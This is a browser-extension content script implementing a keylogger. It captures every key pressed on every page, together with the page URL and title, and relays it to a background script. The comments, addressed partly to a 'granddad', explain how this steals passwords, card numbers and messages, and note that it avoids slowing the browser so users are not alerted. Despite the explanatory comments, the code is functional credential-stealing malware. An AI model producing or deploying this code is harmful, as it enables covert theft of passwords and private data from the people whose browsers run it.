// content.js - Injected into every page to capture keystrokes.

// DANGER: This is the core of the keylogger. It adds an event listener that
// fires every single time a key is pressed down on any page.
// NOTE FOR GRANDDAD: This is the part that spies on your typing. It sets up
// a listener that watches for every key you press on your keyboard.
document.addEventListener('keydown', (event) => {
  // To avoid performance issues, don't wait for a response.
  // SECURITY-NOTE: This sends the captured keystroke data to the background script
  // immediately and asynchronously. This prevents slowing down the user's browser,
  // which might alert them to the monitoring.
  chrome.runtime.sendMessage({
    type: 'keylog',
    data: {
      timestamp: Date.now(),
      // DANGER: Captures the actual key pressed (e.g., 'a', 'b', '@', 'Enter').
      // This is how passwords, messages, and other sensitive text are stolen.
      // NOTE FOR GRANDDAD: This line grabs the exact key you typed. This is how
      // it steals your passwords, credit card numbers, and private messages letter by letter.
      key: event.key,
      code: event.code,
      // SECURITY-NOTE: The URL and page title provide context for the stolen
      // keystrokes, so the attacker knows if the password belongs to a bank or a game.
      // NOTE FOR GRANDDAD: This part also records the website address where you typed.
      // This tells the bad guys that the password you just entered was for your
      // bank account, not just a game.
      url: window.location.href,
      title: document.title
    }
  });
}, true); // Use capture phase to get the event early.